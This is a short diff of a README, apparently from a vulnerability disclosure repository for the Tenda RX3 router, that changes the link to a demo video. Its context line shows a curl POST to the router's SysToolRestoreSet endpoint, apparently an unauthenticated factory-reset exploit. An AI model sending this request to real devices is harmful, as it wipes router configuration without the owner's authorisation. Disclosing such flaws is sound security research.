@@ -20,4 +20,4 @@ curl -i -X POST "http://192.168.0.1/goform/SysToolRestoreSet?reasy-ui-1.0.3.js"
 
 ## Demo
 
-https://github.com/Zeyfrost/tenda-rx3-vulns/raw/master/factory_reset_no_auth/demo.mp4
+https://github.com/user-attachments/assets/46340a2b-ee90-45d2-b850-0bce63283c9b
